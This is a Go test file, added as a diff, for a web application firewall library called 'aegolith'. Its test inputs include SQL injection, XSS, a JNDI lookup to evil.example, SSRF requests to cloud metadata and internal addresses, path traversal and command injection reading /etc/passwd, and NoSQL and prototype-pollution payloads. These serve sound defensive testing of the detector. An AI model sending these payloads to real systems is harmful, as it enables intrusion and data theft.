@@ -1,0 +1,767 @@
+package aegolith_test
+
+import (
+	"bytes"
+	"fmt"
+	"mime/multipart"
+	"net/http"
+	"os"
+	"path/filepath"
+	"reflect"
+	"strings"
+	"sync"
+	"testing"
+	"time"
+
+	"github.com/ergasterion-dev/aegolith"
+)
+
+func mustNew(t *testing.T, cfg aegolith.Config) *aegolith.Firewall {
+	t.Helper()
+	fw, err := aegolith.New(cfg)
+	if err != nil {
+		t.Fatalf("New: %v", err)
+	}
+	return fw
+}
+
+// get builds a GET request from a target such as "/a?b=c".
+func get(target string) *aegolith.Request {
+	path, query, _ := strings.Cut(target, "?")
+	return &aegolith.Request{Method: "GET", RawPath: path, RawQuery: query, Header: http.Header{}}
+}
+
+func withBody(method, target, contentType, body string) *aegolith.Request {
+	r := get(target)
+	r.Method = method
+	r.Header.Set("Content-Type", contentType)
+	r.Body = []byte(body)
+	return r
+}
+
+func postJSON(target, body string) *aegolith.Request {
+	return withBody("POST", target, "application/json", body)
+}
+
+func find(d aegolith.Decision, id string) (aegolith.Match, bool) {
+	for _, m := range d.Matches {
+		if m.RuleID == id {
+			return m, true
+		}
+	}
+	return aegolith.Match{}, false
+}
+
+func ruleIDs(d aegolith.Decision) []string {
+	var out []string
+	for _, m := range d.Matches {
+		out = append(out, m.RuleID+"@"+m.Field)
+	}
+	return out
+}
+
+// mustHave returns the match for rule id on field (any field when empty).
+func mustHave(t *testing.T, d aegolith.Decision, id, field string) aegolith.Match {
+	t.Helper()
+	for _, m := range d.Matches {
+		if m.RuleID == id && (field == "" || m.Field == field) {
+			return m
+		}
+	}
+	t.Fatalf("missing %s@%s; matches %v", id, field, ruleIDs(d))
+	return aegolith.Match{}
+}
+
+func mustNotHave(t *testing.T, d aegolith.Decision, id string) {
+	t.Helper()
+	if _, ok := find(d, id); ok {
+		t.Fatalf("unexpected %s; matches %v", id, ruleIDs(d))
+	}
+}
+
+const sqliSearch = "/api/v1/products/search?q=1%27%20OR%20%271%27%3D%271"
+
+func TestInspectGenericBlocksSQLiInQuery(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	d := fw.Inspect(get(sqliSearch))
+	if d.Action != aegolith.ActionBlock || d.Monitored || d.Err != nil {
+		t.Fatalf("decision %+v", d)
+	}
+	m := mustHave(t, d, "AEG-SQLI-001", "query.q")
+	if m.Location != aegolith.LocQuery || m.Category != aegolith.CatSQLi || m.Action != aegolith.ActionBlock {
+		t.Fatalf("match %+v", m)
+	}
+}
+
+func TestInspectMonitorMode(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
+	d := fw.Inspect(get(sqliSearch))
+	if d.Action != aegolith.ActionAllow || !d.Monitored {
+		t.Fatalf("decision %+v", d)
+	}
+	mustHave(t, d, "AEG-SQLI-001", "query.q")
+}
+
+func TestInspectCleanRequestAllowed(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	for _, r := range []*aegolith.Request{
+		get("/api/v1/products/search?q=milk+%26+bread&page=2"),
+		postJSON("/api/v1/cart/items", `{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2,"note":"Gate code 1234 & leave at door"}`),
+		withBody("POST", "/api/v1/reviews", "application/x-www-form-urlencoded", "rating=5&text=Great+product%2C+would+buy+again"),
+	} {
+		r.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+		r.Header.Set("Referer", "http://localhost:3000/checkout")
+		d := fw.Inspect(r)
+		if d.Action != aegolith.ActionAllow || d.Monitored || len(d.Matches) != 0 {
+			t.Fatalf("%s %s: %+v", r.Method, r.RawPath, d)
+		}
+	}
+}
+
+func cartRoute() aegolith.Route {
+	return aegolith.Route{
+		Method: "POST", Path: "/api/v1/cart/items",
+		Body: map[string]aegolith.Field{
+			"product_id": {Type: aegolith.TypeUUID},
+			"qty":        {Type: aegolith.TypeInt},
+			"note":       {Type: aegolith.TypeText, MaxLen: 500},
+		},
+	}
+}
+
+func TestInspectTypedFieldSkipsDetectors(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{cartRoute()}})
+	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":"1 OR 1=1"}`))
+	m := mustHave(t, d, "AEG-SCHEMA-001", "body.qty")
+	if m.Action != aegolith.ActionBlock || m.Category != aegolith.CatSchema {
+		t.Fatalf("schema match %+v", m)
+	}
+	mustNotHave(t, d, "AEG-SQLI-001")
+
+	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
+	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":"1 OR 1=1"}`)); d.Action != aegolith.ActionBlock {
+		t.Fatalf("enforce: %+v", d)
+	}
+	// A text field is still scanned.
+	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"note":"1' OR '1'='1"}`))
+	mustHave(t, d, "AEG-SQLI-001", "body.note")
+	// A valid typed request passes.
+	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2,"note":"leave at door"}`))
+	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
+		t.Fatalf("valid typed request: %+v", d)
+	}
+}
+
+func TestInspectUnknownRouteMonitors(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
+	d := fw.Inspect(get("/api/v1/brand-new-endpoint?x=1"))
+	if d.Action != aegolith.ActionAllow || !d.Monitored {
+		t.Fatalf("decision %+v", d)
+	}
+	m := mustHave(t, d, "AEG-ROUTE-001", "path")
+	if m.Action != aegolith.ActionMonitor || m.Category != aegolith.CatRoute {
+		t.Fatalf("route match %+v", m)
+	}
+	// Attacks on unknown routes are still found (inputs are untyped).
+	d = fw.Inspect(get("/api/v1/brand-new-endpoint?q=1%27%20OR%20%271%27%3D%271"))
+	if d.Action != aegolith.ActionBlock {
+		t.Fatalf("attack on unknown route: %+v", d)
+	}
+	// UnknownRoute block.
+	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}, UnknownRoute: aegolith.ActionBlock})
+	if d := fw.Inspect(get("/api/v1/brand-new-endpoint")); d.Action != aegolith.ActionBlock {
+		t.Fatalf("unknown route block: %+v", d)
+	}
+	// No routes configured: no route rule at all.
+	fw = mustNew(t, aegolith.Config{})
+	mustNotHave(t, fw.Inspect(get("/api/v1/brand-new-endpoint")), "AEG-ROUTE-001")
+}
+
+func TestInspectExclusion(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{
+		{Rule: "AEG-SQLI-*", Route: "GET /api/v1/products/search", Field: "query.q"},
+	}})
+	d := fw.Inspect(get(sqliSearch))
+	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
+		t.Fatalf("excluded: %+v", d)
+	}
+	// Another field or route is not excluded.
+	if d := fw.Inspect(get("/api/v1/products/search?term=1%27%20OR%20%271%27%3D%271")); d.Action != aegolith.ActionBlock {
+		t.Fatalf("other field: %+v", d)
+	}
+	if d := fw.Inspect(get("/api/v1/products/list?q=1%27%20OR%20%271%27%3D%271")); d.Action != aegolith.ActionBlock {
+		t.Fatalf("other route: %+v", d)
+	}
+}
+
+func TestInspectExclusionByCategoryAndWildcards(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "sqli", Route: "*", Field: "query.*"}}})
+	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionAllow {
+		t.Fatalf("category exclusion: %+v", d)
+	}
+	fw = mustNew(t, aegolith.Config{Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-001"}}})
+	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionAllow {
+		t.Fatalf("empty route/field mean any: %+v", d)
+	}
+}
+
+// Ruling 10: when routes exist but none matched, the exclusion route key is
+// METHOD + space + decoded path.
+func TestInspectExclusionUnmatchedRouteKey(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{
+		Routes:     []aegolith.Route{cartRoute()},
+		Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-001", Route: "GET /api/v1/legacy search", Field: "query.q"}},
+	})
+	d := fw.Inspect(get("/api/v1/legacy%20search?q=1%27%20OR%20%271%27%3D%271"))
+	if d.Action != aegolith.ActionAllow {
+		t.Fatalf("decision %+v", d)
+	}
+	mustNotHave(t, d, "AEG-SQLI-001")
+	// On a matched route the key is the route template.
+	fw = mustNew(t, aegolith.Config{
+		Routes:     []aegolith.Route{{Method: "GET", Path: "/api/v1/products/:id"}},
+		Exclusions: []aegolith.Exclusion{{Rule: "AEG-SQLI-001", Route: "GET /api/v1/products/:id", Field: "query.q"}},
+	})
+	if d := fw.Inspect(get("/api/v1/products/42?q=1%27%20OR%20%271%27%3D%271")); d.Action != aegolith.ActionAllow {
+		t.Fatalf("template key: %+v", d)
+	}
+}
+
+func TestInspectRuleActionOverride(t *testing.T) {
+	scan := get("/api/v1/products")
+	scan.Header.Set("User-Agent", "sqlmap/1.7.2#stable (https://sqlmap.org)")
+	fw := mustNew(t, aegolith.Config{})
+	if d := fw.Inspect(scan); d.Action != aegolith.ActionBlock {
+		t.Fatalf("scanner default: %+v", d)
+	}
+	fw = mustNew(t, aegolith.Config{RuleActions: map[string]aegolith.Action{"scanner": aegolith.ActionMonitor}})
+	d := fw.Inspect(scan)
+	if d.Action != aegolith.ActionAllow || !d.Monitored {
+		t.Fatalf("scanner monitor: %+v", d)
+	}
+	if m := mustHave(t, d, "AEG-SCANNER-001", "header.user-agent"); m.Action != aegolith.ActionMonitor {
+		t.Fatalf("match action %v", m.Action)
+	}
+	// Exact ID beats prefix beats category; allow drops the match.
+	fw = mustNew(t, aegolith.Config{RuleActions: map[string]aegolith.Action{
+		"sqli": aegolith.ActionMonitor, "AEG-SQLI-*": aegolith.ActionBlock, "AEG-SQLI-001": aegolith.ActionAllow,
+	}})
+	d = fw.Inspect(get(sqliSearch))
+	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
+		t.Fatalf("exact allow: %+v", d)
+	}
+	fw = mustNew(t, aegolith.Config{RuleActions: map[string]aegolith.Action{"sqli": aegolith.ActionMonitor, "AEG-SQLI-*": aegolith.ActionBlock}})
+	if d := fw.Inspect(get(sqliSearch)); d.Action != aegolith.ActionBlock {
+		t.Fatalf("prefix beats category: %+v", d)
+	}
+	// Unknown route can be made to block through RuleActions too.
+	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}, RuleActions: map[string]aegolith.Action{"AEG-ROUTE-001": aegolith.ActionBlock}})
+	if d := fw.Inspect(get("/nope")); d.Action != aegolith.ActionBlock {
+		t.Fatalf("route override: %+v", d)
+	}
+}
+
+func hugeJSON(n int) string {
+	var b strings.Builder
+	b.WriteString("{")
+	for i := range n {
+		if i > 0 {
+			b.WriteString(",")
+		}
+		fmt.Fprintf(&b, `"k%d":1`, i)
+	}
+	b.WriteString("}")
+	return b.String()
+}
+
+func TestInspectHugeBody(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	r := postJSON("/api/v1/import", hugeJSON(100000))
+	if len(r.Body) <= 1<<20 {
+		t.Fatalf("body should exceed the 1 MiB limit, is %d bytes", len(r.Body))
+	}
+	fw.Inspect(postJSON("/warm", `{"a":1}`)) // first-call setup is not what is measured
+	start := time.Now()
+	d := fw.Inspect(r)
+	el := time.Since(start)
+	t.Logf("inspect took %v", el)
+	if el > 200*time.Millisecond {
+		t.Fatalf("took %v", el)
+	}
+	m := mustHave(t, d, "AEG-PROTO-010", "body")
+	if m.Action != aegolith.ActionMonitor || d.Action != aegolith.ActionAllow || !d.Monitored {
+		t.Fatalf("decision %+v", d)
+	}
+	// Deep nesting is a limit hit too.
+	d = fw.Inspect(postJSON("/x", strings.Repeat("[", 5000)))
+	mustHave(t, d, "AEG-PROTO-010", "body")
+}
+
+func TestInspectMalformedJSON(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"note":"ok"`))
+	if d.Action != aegolith.ActionAllow || !d.Monitored {
+		t.Fatalf("plain malformed: %+v", d)
+	}
+	if m := mustHave(t, d, "AEG-PROTO-020", "body"); m.Action != aegolith.ActionMonitor {
+		t.Fatalf("%+v", m)
+	}
+	// An attack in the unparsable part is found by scanning the raw body.
+	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"note":"x", "q": "1' OR '1'='1' --`))
+	mustHave(t, d, "AEG-PROTO-020", "body")
+	if d.Action != aegolith.ActionBlock {
+		t.Fatalf("attack in malformed body: %+v", d)
+	}
+}
+
+// Ruling 1: the malformed-JSON raw body is capped at MaxValueLen.
+func TestInspectMalformedJSONRawBodyCapped(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
+	body := `{"pad":"` + strings.Repeat("a", 9000) + `", "q": "1' OR '1'='1' --`
+	d := fw.Inspect(postJSON("/x", body))
+	mustHave(t, d, "AEG-PROTO-020", "body")
+	if m := mustHave(t, d, "AEG-PROTO-011", "body"); m.Action != aegolith.ActionMonitor {
+		t.Fatalf("%+v", m)
+	}
+	mustNotHave(t, d, "AEG-SQLI-001")
+}
+
+// Rulings 1 and 2: every value is capped, JSON strings included.
+func TestInspectLongValuesCapped(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
+	long := strings.Repeat("a", 8192) + "1' OR '1'='1"
+	d := fw.Inspect(get("/s?q=" + long))
+	mustHave(t, d, "AEG-PROTO-011", "query.q")
+	mustNotHave(t, d, "AEG-SQLI-001")
+
+	d = fw.Inspect(postJSON("/s", `{"note":"`+long+`"}`))
+	mustHave(t, d, "AEG-PROTO-011", "body.note")
+	mustNotHave(t, d, "AEG-SQLI-001")
+
+	// Within the prefix an attack is still found.
+	d = fw.Inspect(postJSON("/s", `{"note":"1' OR '1'='1`+strings.Repeat(" ", 9000)+`"}`))
+	mustHave(t, d, "AEG-PROTO-011", "body.note")
+	mustHave(t, d, "AEG-SQLI-001", "body.note")
+
+	// XML bodies are capped too.
+	fw = mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, AllowXML: true})
+	d = fw.Inspect(withBody("POST", "/x", "application/xml", "<a>"+strings.Repeat("b", 9000)+"</a>"))
+	mustHave(t, d, "AEG-PROTO-011", "body")
+}
+
+// Ruling 3: query and form pairs stop at MaxFields.
+func TestInspectQueryAndFormFieldLimit(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Limits: aegolith.Limits{MaxFields: 10}})
+	var q []string
+	for i := range 20 {
+		q = append(q, fmt.Sprintf("k%d=v", i))
+	}
+	q = append(q, "z=1%27%20OR%20%271%27%3D%271")
+	d := fw.Inspect(get("/s?" + strings.Join(q, "&")))
+	mustHave(t, d, "AEG-PROTO-010", "query")
+	mustNotHave(t, d, "AEG-SQLI-001")
+
+	d = fw.Inspect(withBody("POST", "/s", "application/x-www-form-urlencoded", strings.Join(q, "&")))
+	mustHave(t, d, "AEG-PROTO-010", "form")
+	mustNotHave(t, d, "AEG-SQLI-001")
+
+	// Exactly MaxFields pairs (empty segments ignored) is fine.
+	d = fw.Inspect(get("/s?" + strings.Join(q[:10], "&") + "&&&"))
+	mustNotHave(t, d, "AEG-PROTO-010")
+}
+
+func multipartBody(t *testing.T, fn func(w *multipart.Writer)) (string, string) {
+	t.Helper()
+	var buf bytes.Buffer
+	w := multipart.NewWriter(&buf)
+	fn(w)
+	if err := w.Close(); err != nil {
+		t.Fatal(err)
+	}
+	return buf.String(), w.FormDataContentType()
+}
+
+func TestInspectMultipartFileNotScanned(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	body, ct := multipartBody(t, func(w *multipart.Writer) {
+		_ = w.WriteField("title", "my avatar")
+		fw, _ := w.CreateFormFile("upload", "page.html")
+		_, _ = fw.Write([]byte("<script>alert(document.cookie)</script> ' OR '1'='1"))
+	})
+	d := fw.Inspect(withBody("POST", "/api/v1/uploads", ct, body))
+	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
+		t.Fatalf("file part scanned: %+v", d)
+	}
+	// Non-file parts are scanned.
+	body, ct = multipartBody(t, func(w *multipart.Writer) {
+		_ = w.WriteField("title", "<script>alert(1)</script>")
+	})
+	d = fw.Inspect(withBody("POST", "/api/v1/uploads", ct, body))
+	mustHave(t, d, "AEG-XSS-001", "form.title")
+}
+
+// Ruling 4: a truncated multipart value raises AEG-PROTO-011.
+func TestInspectMultipartTruncated(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
+	body, ct := multipartBody(t, func(w *multipart.Writer) {
+		_ = w.WriteField("bio", strings.Repeat("a", 9000))
+	})
+	d := fw.Inspect(withBody("POST", "/u", ct, body))
+	if m := mustHave(t, d, "AEG-PROTO-011", "form.bio"); m.Action != aegolith.ActionMonitor {
+		t.Fatalf("%+v", m)
+	}
+}
+
+// Ruling 5: header keys are canonicalized before protocol checks.
+func TestInspectNonCanonicalHeaderKeys(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	r := get("/a")
+	r.Method = "POST"
+	r.Header = http.Header{"transfer-encoding": {"gzip, chunked"}}
+	mustHave(t, fw.Inspect(r), "AEG-PROTO-006", "header.transfer-encoding")
+
+	r = get("/a")
+	r.Method = "POST"
+	r.Header = http.Header{"content-type": {"application/xml"}}
+	r.Body = []byte("<a/>")
+	mustHave(t, fw.Inspect(r), "AEG-PROTO-002", "header.content-type")
+
+	r = get("/a")
+	r.Header = http.Header{"user-agent": {"Nikto/2.5.0"}}
+	mustHave(t, fw.Inspect(r), "AEG-SCANNER-001", "header.user-agent")
+}
+
+func TestInspectPathRulesAndTrailingTraversal(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	mustHave(t, fw.Inspect(get("/.env")), "AEG-SCANNER-002", "path")
+	mustHave(t, fw.Inspect(get("/config.php.bak")), "AEG-SCANNER-003", "path")
+	mustHave(t, fw.Inspect(get("/api/v1/files/%2e%2e")), "AEG-PROTO-005", "path")
+}
+
+// Ruling 12: params are matched on the raw path and decoded afterwards, so
+// %2F cannot split or forge a segment.
+func TestInspectPathParamsDecodedAfterMatch(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{
+		{Method: "GET", Path: "/api/v1/orders/:id", PathParams: map[string]aegolith.Field{"id": {Type: aegolith.TypeUUID}}},
+		{Method: "GET", Path: "/api/v1/files/:name/meta"},
+	}})
+	d := fw.Inspect(get("/api/v1/orders/4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b"))
+	if len(d.Matches) != 0 {
+		t.Fatalf("valid uuid: %v", ruleIDs(d))
+	}
+	d = fw.Inspect(get("/api/v1/orders/a%2Fb"))
+	mustNotHave(t, d, "AEG-ROUTE-001")
+	mustHave(t, d, "AEG-SCHEMA-001", "path.id")
+
+	d = fw.Inspect(get("/api/v1/files/x%2F..%2Fy/meta"))
+	mustNotHave(t, d, "AEG-ROUTE-001")
+	d = fw.Inspect(get("/api/v1/files/1%27%20OR%20%271%27%3D%271/meta"))
+	mustHave(t, d, "AEG-SQLI-001", "path.name")
+}
+
+// Ruling 8: url-typed fields get SSRF (both rules) plus ScanText; text gets
+// SSRF through ScanText.
+func TestInspectSSRF(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{{
+		Method: "POST", Path: "/api/v1/products",
+		Body: map[string]aegolith.Field{"image_url": {Type: aegolith.TypeURL}, "description": {Type: aegolith.TypeText}},
+	}}})
+	d := fw.Inspect(postJSON("/api/v1/products", `{"image_url":"http://169.254.169.254/latest/meta-data/"}`))
+	mustHave(t, d, "AEG-SSRF-001", "body.image_url")
+	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"http://127.0.0.1:8080/admin"}`))
+	mustHave(t, d, "AEG-SSRF-002", "body.image_url")
+	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"https://cdn.example.com/a.png?x=%3Cscript%3Ealert(1)%3C/script%3E"}`))
+	mustNotHave(t, d, "AEG-SCHEMA-001")
+	mustHave(t, d, "AEG-XSS-001", "body.image_url")
+	// A quote is not a URL byte: schema mismatch.
+	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"https://cdn.example.com/a.png?x=1'"}`))
+	mustHave(t, d, "AEG-SCHEMA-001", "body.image_url")
+	d = fw.Inspect(postJSON("/api/v1/products", `{"image_url":"https://cdn.example.com/a.png"}`))
+	if len(d.Matches) != 0 {
+		t.Fatalf("clean url: %v", ruleIDs(d))
+	}
+	d = fw.Inspect(postJSON("/api/v1/products", `{"description":"see http://10.0.0.5/internal"}`))
+	mustHave(t, d, "AEG-SSRF-002", "body.description")
+}
+
+// Ruling 13: string, text, email and url get ScanText after validation;
+// fully constrained types do not.
+func TestInspectStringLikeTypesStillScanned(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor, Routes: []aegolith.Route{{
+		Method: "POST", Path: "/api/v1/signup",
+		Body: map[string]aegolith.Field{
+			"email": {Type: aegolith.TypeEmail}, "name": {Type: aegolith.TypeString},
+			"kind": {Type: aegolith.TypeEnum, Enum: []string{"a", "b"}},
+		},
+	}}})
+	d := fw.Inspect(postJSON("/api/v1/signup", `{"email":"'or'1'='1'--@x.io"}`))
+	mustNotHave(t, d, "AEG-SCHEMA-001")
+	mustHave(t, d, "AEG-SQLI-001", "body.email")
+	d = fw.Inspect(postJSON("/api/v1/signup", `{"name":"<script>alert(1)</script>"}`))
+	mustHave(t, d, "AEG-XSS-001", "body.name")
+	d = fw.Inspect(postJSON("/api/v1/signup", `{"email":"o'brien@example.com","name":"Mary O'Brien","kind":"a"}`))
+	if len(d.Matches) != 0 {
+		t.Fatalf("legit: %v", ruleIDs(d))
+	}
+}
+
+// Ruling 14: JSON non-strings for string-like types are schema mismatches.
+func TestInspectJSONNonStringForStringType(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
+	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"note":5}`))
+	mustHave(t, d, "AEG-SCHEMA-001", "body.note")
+	if d.Action != aegolith.ActionBlock {
+		t.Fatalf("%+v", d)
+	}
+	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"product_id":true}`))
+	mustHave(t, d, "AEG-SCHEMA-001", "body.product_id")
+	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":3,"note":null}`))
+	if d.Action != aegolith.ActionAllow || len(d.Matches) != 0 {
+		t.Fatalf("null and int: %v", ruleIDs(d))
+	}
+}
+
+func TestInspectUnknownFields(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}})
+	d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"coupon":"SAVE10"}`))
+	if d.Action != aegolith.ActionAllow || !d.Monitored {
+		t.Fatalf("default monitor: %+v", d)
+	}
+	mustHave(t, d, "AEG-SCHEMA-002", "body.coupon")
+	// Undeclared values are scanned as untyped.
+	d = fw.Inspect(postJSON("/api/v1/cart/items", `{"coupon":"1' OR '1'='1"}`))
+	mustHave(t, d, "AEG-SQLI-001", "body.coupon")
+
+	block := aegolith.ActionBlock
+	r := cartRoute()
+	r.UnknownFields = &block
+	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{r}})
+	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"coupon":"SAVE10"}`)); d.Action != aegolith.ActionBlock {
+		t.Fatalf("route block: %+v", d)
+	}
+	fw = mustNew(t, aegolith.Config{Routes: []aegolith.Route{cartRoute()}, UnknownFields: aegolith.ActionBlock})
+	if d := fw.Inspect(postJSON("/api/v1/cart/items", `{"qty":1,"coupon":"SAVE10"}`)); d.Action != aegolith.ActionBlock {
+		t.Fatalf("config block: %+v", d)
+	}
+	// Query on a route that declares no query map is not schema-checked.
+	if d := fw.Inspect(withBody("POST", "/api/v1/cart/items?utm=x", "application/json", `{"qty":1}`)); len(d.Matches) != 0 {
+		t.Fatalf("undeclared location: %v", ruleIDs(d))
+	}
+}
+
+func TestInspectJSONKeysAndSession(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	mustHave(t, fw.Inspect(postJSON("/login", `{"email":{"$ne":null}}`)), "AEG-NOSQL-001", "body.email.$ne")
+	mustHave(t, fw.Inspect(postJSON("/x", `{"__proto__":{"admin":true}}`)), "AEG-PPOLL-001", "body.__proto__")
+	mustHave(t, fw.Inspect(get("/login?email[$ne]=x")), "AEG-NOSQL-002", "query.email[$ne]")
+	mustHave(t, fw.Inspect(get("/x?PHPSESSID=abc")), "AEG-SESSION-001", "query.PHPSESSID")
+	// {"a":"a"}: the key and the equal value are both seen correctly.
+	if d := fw.Inspect(postJSON("/x", `{"constructor":"constructor"}`)); len(d.Matches) != 1 {
+		t.Fatalf("key/value: %v", ruleIDs(d))
+	}
+}
+
+func TestInspectCookiesAndHeaders(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{InspectHeaders: []string{"x-search-term"}})
+	r := get("/a")
+	r.Header.Set("Cookie", "sid=abc; pref=<script>alert(1)</script>")
+	mustHave(t, fw.Inspect(r), "AEG-XSS-001", "cookie.pref")
+
+	r = get("/a")
+	r.Header.Set("X-Search-Term", "1' OR '1'='1")
+	mustHave(t, fw.Inspect(r), "AEG-SQLI-001", "header.x-search-term")
+
+	r = get("/a")
+	r.Header.Set("Referer", "https://shop.example/p?q=<script>alert(1)</script>")
+	mustHave(t, fw.Inspect(r), "AEG-XSS-001", "header.referer")
+
+	r = get("/a")
+	r.Header.Set("User-Agent", "${jndi:ldap://evil.example/a}")
+	mustHave(t, fw.Inspect(r), "AEG-JNDI-001", "header.user-agent")
+}
+
+func TestInspectSnippetsRedactedAndDeduplicated(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{Mode: aegolith.ModeMonitor})
+	payload := "1%27%20OR%20%271%27%3D%271%20--%20" + strings.Repeat("x", 200)
+	d := fw.Inspect(get("/s?q=" + payload + "&q=" + payload + "&k%0Aey=1%27%20OR%20%271%27%3D%271"))
+	n := 0
+	for _, m := range d.Matches {
+		if len(m.Snippet) > 64 || strings.ContainsAny(m.Snippet+m.Field, "\r\n") {
+			t.Fatalf("unsafe match %+v", m)
+		}
+		if m.RuleID == "AEG-SQLI-001" && m.Field == "query.q" {
+			n++
+		}
+	}
+	if n != 1 {
+		t.Fatalf("query.q SQLi reported %d times: %v", n, ruleIDs(d))
+	}
+	mustHave(t, d, "AEG-SQLI-001", "query.k?ey")
+}
+
+func TestInspectNilSafety(t *testing.T) {
+	fw := mustNew(t, aegolith.Config{})
+	d := fw.Inspect(nil)
+	if d.Action != aegolith.ActionAllow || d.Err == nil {
+		t.Fatalf("nil request: %+v", d)
+	}
+	closed := false
+	fw = mustNew(t, aegolith.Config{FailOpen: &closed})
+	if d := fw.Inspect(nil); d.Action != aegolith.ActionBlock || d.Err == nil {
+		t.Fatalf("nil request fail closed: %+v", d)
+	}
+	var nilFW *aegolith.Firewall
+	if d := nilFW.Inspect(get("/")); d.Err == nil {
+		t.Fatalf("nil firewall: %+v", d)
+	}
+	// A request with a nil header map works.
+	if d := fw.Inspect(&aegolith.Request{Method: "GET", RawPath: "/a"}); d.Err != nil || d.Action != aegolith.ActionAllow {
+		t.Fatalf("nil header: %+v", d)
+	}
+}
+
+func corpusLike() []*aegolith.Request {
+	ua := get("/api/v1/products")
+	ua.Header.Set("User-Agent", "Nikto/2.5.0")
+	cookie := get("/api/v1/me")
+	cookie.Header.Set("Cookie", "sid=abc; theme=dark")
+	return []*aegolith.Request{
+		get(sqliSearch),
+		get("/api/v1/products/search?q=milk+%26+bread"),
+		get("/.git/config"),
+		get("/api/v1/files/..%2f..%2fetc%2fpasswd"),
+		ua,
+		cookie,
+		postJSON("/api/v1/cart/items", `{"product_id":"4b8e2f1a-9c3d-4e5f-8a7b-1c2d3e4f5a6b","qty":2}`),
+		postJSON("/api/v1/cart/items", `{"qty":"1 OR 1=1","note":"<script>alert(1)</script>"}`),
+		postJSON("/api/v1/cart/items", `{"note":"x`),
+		postJSON("/api/v1/login", `{"email":{"$gt":""},"password":"x"}`),
+		withBody("POST", "/api/v1/reviews", "application/x-www-form-urlencoded", "text=nice;+cat+/etc/passwd"),
+		get("/api/v1/unknown?redirect=http://169.254.169.254/"),
+	}
+}
+
+func TestInspectConcurrent(t *testing.T) {
+	block := aegolith.ActionBlock
+	r := cartRoute()
+	r.UnknownFields = &block
+	fw := mustNew(t, aegolith.Config{
+		Routes:     []aegolith.Route{r, {Method: "GET", Path: "/api/v1/products/search", Query: map[string]aegolith.Field{"q": {Type: aegolith.TypeText}}}},
+		Exclusions: []aegolith.Exclusion{{Rule: "AEG-SESSION-*"}},
+	})
+	reqs := corpusLike()
+	want := make([]aegolith.Decision, len(reqs))
+	for i, r := range reqs {
+		want[i] = fw.Inspect(r)
+	}
+	const workers, iters = 64, 1000
+	var wg sync.WaitGroup
+	errs := make(chan string, workers)
+	for w := range workers {
+		wg.Go(func() {
+			for i := range iters {
+				k := (w + i) % len(reqs)
+				if got := fw.Inspect(reqs[k]); !reflect.DeepEqual(got, want[k]) {
+					errs <- fmt.Sprintf("request %d: got %+v want %+v", k, got, want[k])
+					return
+				}
+			}
+		})
+	}
+	wg.Wait()
+	close(errs)
+	for e := range errs {
+		t.Fatal(e)
+	}
+}
